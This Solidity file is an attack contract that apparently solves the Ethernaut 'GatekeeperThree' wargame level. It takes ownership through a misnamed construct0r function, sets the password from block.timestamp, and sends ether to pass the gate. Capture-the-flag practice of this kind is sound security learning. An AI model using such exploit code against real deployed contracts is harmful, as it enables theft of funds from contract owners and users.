// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperThree {
    function construct0r() external;

    function createTrick() external;

    function getAllowance(uint _password) external;

    function enter() external;
}

contract GatekeeperThreeAttack {
    function attack(address payable _gatekeeperThree) payable public {
        GatekeeperThree gatekeeperThree = GatekeeperThree(_gatekeeperThree);
        // Take ownership
        gatekeeperThree.construct0r();
        // Set pasword block.timmestamp
        gatekeeperThree.createTrick();
        // Set allow_entrance = true
        gatekeeperThree.getAllowance(block.timestamp);
        // Enter
        payable(address(gatekeeperThree)).transfer(msg.value);
        gatekeeperThree.enter();
    }
}
